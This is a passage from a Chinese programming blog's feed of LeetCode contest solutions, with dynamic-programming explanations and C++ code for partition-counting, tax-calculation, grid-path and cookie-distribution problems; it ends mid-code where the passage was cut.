<li>$s[j]$ 一定为非质数的数字；</li>
<li>假设以 $s[j]$ 为末尾的最后一个分割的起点为 $k$，则此时一定满足:<ul>
<li>$s[k]$ 一定为质数；</li>
<li>$s[k-1]$ 要么不存在要么为非质数的数字；</li>
<li>前 $k-1$ 个字母一定存在长度为 $i-1$ 段的完美分割；</li>
<li>最后的分段长度一定满足 $j - k \ge minLength$;<br>综上，我们可以得到递推公式如下:<br>$$<br>dp[i][j] &#x3D; \sum_{k &#x3D; 0}^{j - minLength}dp[i-1][k] \quad  (dp[i-1][k] &gt; 0, s[k] \in {1,4,6,8,9}, s[k+1] \in {2,3,5,7})<br>$$</li>
</ul>
</li>
</ul>
<p>可以参考<a href="https://leetcode.cn/problems/number-of-beautiful-partitions/solutions/1981346/dong-tai-gui-hua-jian-ji-xie-fa-xun-huan-xyw3/">题解</a>，难点在于计算 $dp[i][j]$ 时，我们同时计算 $dp[i-1][j-l]$，不太好思考上述的解法细节问题。这样保证所有满足 $dp[i-1][k] &gt; 0, s[k] \in {1,4,6,8,9}, s[k+1] \in {2,3,5,7}$ 的值全部都被计算出来，确实是个不错的思考题目。</p>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \times k)$，其中 $n$ 表示给定的字符串的长度, $k$ 表示分段。</li>
<li>空间复杂度：$O(n \times k)$，其中 $n$ 表示给定的字符串的长度, $k$ 表示分段</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPrime</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> c == <span class="string">&#x27;2&#x27;</span> || c == <span class="string">&#x27;3&#x27;</span> || c == <span class="string">&#x27;5&#x27;</span> || c == <span class="string">&#x27;7&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canPartition</span><span class="params">(<span class="type">const</span> string &amp;s, <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> i == <span class="number">0</span> || i == s.<span class="built_in">size</span>() || (!<span class="built_in">isPrime</span>(s[i - <span class="number">1</span>]) &amp;&amp; <span class="built_in">isPrime</span>(s[i]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">beautifulPartitions</span><span class="params">(string s, <span class="type">int</span> k, <span class="type">int</span> minLength)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isPrime</span>(s[<span class="number">0</span>]) || <span class="built_in">isPrime</span>(s[n - <span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(k + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">            <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i * minLength; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">canPartition</span>(s, j - minLength)) &#123;</span><br><span class="line">                    sum = (sum + dp[i<span class="number">-1</span>][j - minLength]) % mod;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">canPartition</span>(s, j)) &#123;</span><br><span class="line">                    dp[i][j] = sum;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[k][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="1977-划分数字的方案数"><a href="#1977-划分数字的方案数" class="headerlink" title="1977. 划分数字的方案数"></a>1977. 划分数字的方案数</h3><p>你写下了若干 正整数 ，并将它们连接成了一个字符串 <code>num</code> 。但是你忘记给这些数字之间加逗号了。你只记得这一列数字是 非递减 的且 没有 任何数字有前导 <code>0</code> 。</p>
<p>请你返回有多少种可能的 正整数数组 可以得到字符串 <code>num</code> 。由于答案可能很大，将结果对 <code>109 + 7</code> 取余 后返回。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = &quot;327&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：以下为可能的方案：</span><br><span class="line">3, 27</span><br><span class="line">327</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = &quot;094&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：不能有数字有前导 0 ，且所有数字均为正数。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = &quot;0&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：不能有数字有前导 0 ，且所有数字均为正数。</span><br></pre></td></tr></table></figure>
<p>示例 4：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = &quot;9999999999999&quot;</span><br><span class="line">输出：101</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= num.length &lt;= 3500</code></li>
<li><code>num</code> 只含有数字 <code>&#39;0&#39;</code> 到 <code>&#39;9&#39;</code> 。</li>
</ul>
<h4 id="地址-4"><a href="#地址-4" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-ways-to-separate-numbers/description/">https://leetcode.cn/problems/number-of-ways-to-separate-numbers/description/</a></p>
<h4 id="题意-4"><a href="#题意-4" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 前缀和 + 动态规划</p>
</blockquote>
<h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目还是非常难和有意思的题目，我们设 $dp[i][j]$ 前 $i$ 个字母且最后一个数字长度为 $j$ 组成的合法的方案数，此时我们可以知道最后一个数字的长度为 $j$，起点为 $num[i - j]$，最后一个数字一定为 $num[i-j,\cdots,i - 1]$，则可以分析如下：</li>
</ol>
<ul>
<li>要么倒数第二个数字的长度小于 $j$；</li>
<li>要么倒数第二个数字的长度为 $j$，此时该数字为 $num[i-2 \times j,i-j-1]$，此时一定满足 $num[i-j,\cdots,i - 1] &gt; num[i-2 \times j,i-j-1]$；</li>
</ul>
<p>因此我们可以得到如下递推公式:<br>$$<br>dp[i][j] &#x3D; \sum_{k&#x3D;0}^{j-1} dp[i-j][k] + dp[i-j][j] \quad if \quad num[i-j,\cdots,i - 1] \ge num[i-2 \times j,i-j-1]\<br>dp[i][j] &#x3D; \sum_{k&#x3D;0}^{j-1} dp[i-j][k]  \quad if \quad num[i-j,\cdots,i - 1] &lt; num[i-2 \times j,i-j-1]\<br>$$</p>
<p>此时我们只需要令 $sum[i][j] &#x3D; \sum_{k&#x3D;0}^{j} dp[i][k]$ 即可，则上述等式即转换为:<br>$$<br>dp[i][j] &#x3D; sum[i-j][j-1] + dp[i-j][j] \quad (if \quad num[i-j,\cdots,i - 1] \ge num[i-2 \times j,i-j-1])\<br>dp[i][j] &#x3D; sum[i-j][j-1]  \quad (if \quad num[i-j,\cdots,i - 1] &lt; num[i-2 \times j,i-j-1])\<br>$$</p>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$，其中 $n$ 表示给定的字符串的长度。</li>
<li>空间复杂度：$O(n^2)$，其中 $n$ 表示给定的字符串的长度。</li>
</ul>
<h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfCombinations</span><span class="params">(string num)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = num.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (num[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">lcp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (num[i] == num[j]) &#123;</span><br><span class="line">                    lcp[i][j] = lcp[i + <span class="number">1</span>][j + <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    lcp[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                lcp[j][i] = lcp[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> cmp = [&amp;](<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> len) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> x = lcp[i][j];</span><br><span class="line">            <span class="keyword">return</span> x &gt;= len || num[i + x] &gt;= num[j + x];</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">sum</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">        sum[<span class="number">0</span>] = <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n + <span class="number">1</span>, <span class="number">1L</span>);</span><br><span class="line">        sum[<span class="number">1</span>] = <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n + <span class="number">1</span>, <span class="number">1L</span>);</span><br><span class="line">        sum[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = dp[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (num[i - j] == <span class="string">&#x27;0&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">cmp</span>(i - j, i - <span class="number">2</span> * j, j)) &#123;</span><br><span class="line">                    dp[i][j] = (dp[i][j] + sum[i - j][j]) % mod;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = (dp[i][j] + sum[i - j][j - <span class="number">1</span>]) % mod;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                sum[i][j] = (sum[i][j - <span class="number">1</span>] + dp[i][j]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum[n][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest biweekly 297</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/9/</url>
    <content><![CDATA[<h2 id="leetcode-contest-biweekly-297"><a href="#leetcode-contest-biweekly-297" class="headerlink" title="leetcode  contest biweekly 297"></a>leetcode  contest biweekly 297</h2><p>早上太忙，匆匆参加了周赛，感觉第三题竟然出了点小意外，有个小的符号错误没有检查出来。<br><img src="https://cdn.mathpix.com/snip/images/EPHEWXIc19dxuU-NdFG7_FeXYRpcomkXHWiWMuzxPFw.original.fullsize.png"></p>
<h3 id="5259-计算应缴税款总额"><a href="#5259-计算应缴税款总额" class="headerlink" title="5259. 计算应缴税款总额"></a>5259. 计算应缴税款总额</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的二维整数数组 <code>brackets</code> ，其中 <code>brackets[i] = [upperi, percenti]</code> ，表示第 <code>i</code> 个税级的上限是 <code>upperi</code> ，征收的税率为 <code>percenti</code> 。税级按上限 从低到高排序（在满足 <code>0 &lt; i &lt; brackets.length</code> 的前提下，<code>upperi-1 &lt; upperi</code>）。</p>
<p>税款计算方式如下：</p>
<ul>
<li>不超过 <code>upper0</code>的收入按税率 <code>percent0</code> 缴纳</li>
<li>接着 <code>upper1 - upper0</code> 的部分按税率 <code>percent1</code> 缴纳</li>
<li>然后 <code>upper2 - upper1</code> 的部分按税率 <code>percent2</code> 缴纳<br>以此类推<br>给你一个整数 <code>income</code> 表示你的总收入。返回你需要缴纳的税款总额。与标准答案误差不超 <code>10-5</code> 的结果将被视作正确答案。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：brackets = [[3,50],[7,10],[12,25]], income = 10</span><br><span class="line">输出：2.65000</span><br><span class="line">解释：</span><br><span class="line">前 $3 的税率为 50% 。需要支付税款 $3 * 50% = $1.50 。</span><br><span class="line">接下来 $7 - $3 = $4 的税率为 10% 。需要支付税款 $4 * 10% = $0.40 。</span><br><span class="line">最后 $10 - $7 = $3 的税率为 25% 。需要支付税款 $3 * 25% = $0.75 。</span><br><span class="line">需要支付的税款总计 $1.50 + $0.40 + $0.75 = $2.65 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：brackets = [[1,0],[4,25],[5,50]], income = 2</span><br><span class="line">输出：0.25000</span><br><span class="line">解释：</span><br><span class="line">前 $1 的税率为 0% 。需要支付税款 $1 * 0% = $0 。</span><br><span class="line">剩下 $1 的税率为 25% 。需要支付税款 $1 * 25% = $0.25 。</span><br><span class="line">需要支付的税款总计 $0 + $0.25 = $0.25 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：brackets = [[2,50]], income = 0</span><br><span class="line">输出：0.00000</span><br><span class="line">解释：</span><br><span class="line">没有收入，无需纳税，需要支付的税款总计 $0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= brackets.length &lt;= 100</code></li>
<li><code>1 &lt;= upperi &lt;= 1000</code></li>
<li><code>0 &lt;= percenti &lt;= 100</code></li>
<li><code>0 &lt;= income &lt;= 1000</code></li>
<li><code>upperi</code> 按递增顺序排列</li>
<li><code>upperi</code> 中的所有值 互不相同</li>
<li>最后一个税级的上限大于等于 <code>income</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/calculate-amount-paid-in-taxes">https://leetcode.cn/problems/calculate-amount-paid-in-taxes</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>每次求出区间 $[upper_i, upper_{i+1}]$ 内的值然后将其乘以 $percent_i$ 即为区间内缴纳的税，最后统计所有的税收之和即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, 其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">calculateTax</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; brackets, <span class="type">int</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="type">double</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; brackets.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (income &gt;= last) &#123;</span><br><span class="line">                <span class="type">int</span> x = <span class="built_in">min</span>(income, brackets[i][<span class="number">0</span>]) - last;</span><br><span class="line">                res += x * <span class="number">1.0</span> * brackets[i][<span class="number">1</span>] / <span class="number">100.0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            last = brackets[i][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="5270-网格中的最小路径代价"><a href="#5270-网格中的最小路径代价" class="headerlink" title="5270. 网格中的最小路径代价"></a>5270. 网格中的最小路径代价</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的整数矩阵 <code>grid</code> ，矩阵大小为 <code>m x n</code> ，由从 <code>0 </code>到 <code>m * n - 1</code> 的不同整数组成。你可以在此矩阵中，从一个单元格移动到 下一行 的任何其他单元格。如果你位于单元格 <code>(x, y)</code> ，且满足 <code>x &lt; m - 1</code> ，你可以移动到 <code>(x + 1, 0), (x + 1, 1), ..., (x + 1, n - 1)</code> 中的任何一个单元格。注意： 在最后一行中的单元格不能触发移动。</p>
<p>每次可能的移动都需要付出对应的代价，代价用一个下标从 <code>0</code> 开始的二维数组 <code>moveCost</code> 表示，该数组大小为 <code>(m * n) x n</code> ，其中 <code>moveCost[i][j]</code> 是从值为 <code>i</code> 的单元格移动到下一行第 <code>j</code> 列单元格的代价。从 <code>grid</code> 最后一行的单元格移动的代价可以忽略。</p>
<p><code>grid</code> 一条路径的代价是：所有路径经过的单元格的 值之和 加上 所有移动的 代价之和 。从 第一行 任意单元格出发，返回到达 最后一行 任意单元格的最小路径代价。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[5,3],[4,0],[2,1]], moveCost = [[9,8],[1,5],[10,12],[18,6],[2,4],[14,3]]</span><br><span class="line">输出：17</span><br><span class="line">解释：最小代价的路径是 5 -&gt; 0 -&gt; 1 。</span><br><span class="line">- 路径途经单元格值之和 5 + 0 + 1 = 6 。</span><br><span class="line">- 从 5 移动到 0 的代价为 3 。</span><br><span class="line">- 从 0 移动到 1 的代价为 8 。</span><br><span class="line">路径总代价为 6 + 3 + 8 = 17 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[5,1,2],[4,0,3]], moveCost = [[12,10,15],[20,23,8],[21,7,1],[8,1,13],[9,10,25],[5,3,2]]</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">最小代价的路径是 2 -&gt; 3 。 </span><br><span class="line">- 路径途经单元格值之和 2 + 3 = 5 。 </span><br><span class="line">- 从 2 移动到 3 的代价为 1 。 </span><br><span class="line">路径总代价为 5 + 1 = 6 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>2 &lt;= m, n &lt;= 50</code></li>
<li><code>grid</code> 由从 <code>0</code> 到 <code>m * n - 1</code> 的不同整数组成</li>
<li><code>moveCost.length == m * n</code></li>
<li><code>moveCost[i].length == n</code></li>
<li><code>1 &lt;= moveCost[i][j] &lt;= 100</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-path-cost-in-a-grid">https://leetcode.cn/problems/minimum-path-cost-in-a-grid</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的规划，常规题目，设 $dp[i][j]$ 表示到达 $i,j$ 的最小代价，则可以知道递推公式为 $dp[i][j] &#x3D; min(dp[i-1][k] + \textit{moveCost}[dp[i-1][k]][j]) + \textit{grid}[i][j]$, 根据以上递推公式求出到达第 $m-1$ 行的最小值即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \times n^2)$，其中 $m$ 为矩阵的行数， $n$ 表示矩阵的列数。</li>
<li>空间复杂度：$O(m \times n)$, 可以使用滚动数组优化到 $O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathCost</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; moveCost)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, INT_MAX));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = grid[<span class="number">0</span>][i];</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], grid[i][j] + dp[i<span class="number">-1</span>][k] + moveCost[grid[i<span class="number">-1</span>][k]][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">min_element</span>(dp[m<span class="number">-1</span>].<span class="built_in">begin</span>(), dp[m<span class="number">-1</span>].<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="5289-公平分发饼干"><a href="#5289-公平分发饼干" class="headerlink" title="5289. 公平分发饼干"></a>5289. 公平分发饼干</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>cookies</code> ，其中 <code>cookies[i]</code> 表示在第 <code>i</code> 个零食包中的饼干数量。另给你一个整数 <code>k</code> 表示等待分发零食包的孩子数量，所有 零食包都需要分发。在同一个零食包中的所有饼干都必须分发给同一个孩子，不能分开。</p>
<p>分发的 不公平程度 定义为单个孩子在分发过程中能够获得饼干的最大总数。</p>
<p>返回所有分发的最小不公平程度。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：cookies = [8,15,10,20,8], k = 2</span><br><span class="line">输出：31</span><br><span class="line">解释：一种最优方案是 [8,15,8] 和 [10,20] 。</span><br><span class="line">- 第 1 个孩子分到 [8,15,8] ，总计 8 + 15 + 8 = 31 块饼干。</span><br><span class="line">- 第 2 个孩子分到 [10,20] ，总计 10 + 20 = 30 块饼干。</span><br><span class="line">分发的不公平程度为 max(31,30) = 31 。</span><br><span class="line">可以证明不存在不公平程度小于 31 的分发方案。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：cookies = [6,1,3,2,2,4,1,2], k = 3</span><br><span class="line">输出：7</span><br><span class="line">解释：一种最优方案是 [6,1]、[3,2,2] 和 [4,1,2] 。</span><br><span class="line">- 第 1 个孩子分到 [6,1] ，总计 6 + 1 = 7 块饼干。 </span><br><span class="line">- 第 2 个孩子分到 [3,2,2] ，总计 3 + 2 + 2 = 7 块饼干。</span><br><span class="line">- 第 3 个孩子分到 [4,1,2] ，总计 4 + 1 + 2 = 7 块饼干。</span><br><span class="line">分发的不公平程度为 max(7,7,7) = 7 。</span><br><span class="line">可以证明不存在不公平程度小于 7 的分发方案。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= cookies.length &lt;= 8</code></li>
<li><code>1 &lt;= cookies[i] &lt;= 105</code></li>
<li><code>2 &lt;= k &lt;= cookies.length</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/fair-distribution-of-cookies">https://leetcode.cn/problems/fair-distribution-of-cookies</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数位动态规划
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉是老掉牙的题目了，一点新意都没有，基本上妥妥的模板题目了。。设 $dp[i][state]$ 表示前 $i$ 孩子分配 $state$ 表示的饼干所取得的最小不公平值，此时我们可以知道 $dp[i+1][j] &#x3D; \min(\max(dp[i][s] + sum[j \oplus s])) \qquad s \in j$，状态 $s$ 是 $j$ 的二进制子集。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(k \times 3 ^ n)$, 其中 $k$ 人数，$n$ 表示饼干的数目。</li>
<li>空间复杂度：$O(k \times 2 ^ n)$，其中 $k$ 人数，$n$ 表示饼干的数目, 可以进行滚动数组优化空间为 $2^n$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><ul>
<li>反向 <code>dp</code>:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">distributeCookies</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; cookies, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = cookies.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(k + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">1</span>&lt;&lt;n, INT_MAX));</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(<span class="number">1</span>&lt;&lt;n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span>&lt;&lt;n); i++) &#123;</span><br><span class="line">            <span 